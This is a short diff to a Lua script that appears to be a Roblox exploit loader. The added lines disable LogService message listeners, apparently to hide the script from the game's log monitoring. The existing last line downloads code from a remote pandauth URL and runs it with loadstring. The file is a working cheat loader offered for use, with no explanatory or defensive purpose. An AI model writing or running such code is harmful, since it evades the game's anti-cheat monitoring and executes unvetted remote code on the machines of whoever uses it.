@@ -1,2 +1,9 @@
 --bbz
+if getconnections then
+    for i, v in next, getconnections(game:GetService("LogService").MessageOut) do
+        if v.Function == nil then
+            v:Disable()
+        end
+    end
+end
 loadstring(game:HttpGet("https://vss.pandauth.com/virtual/file/a4e5b7bea65a486b"))()
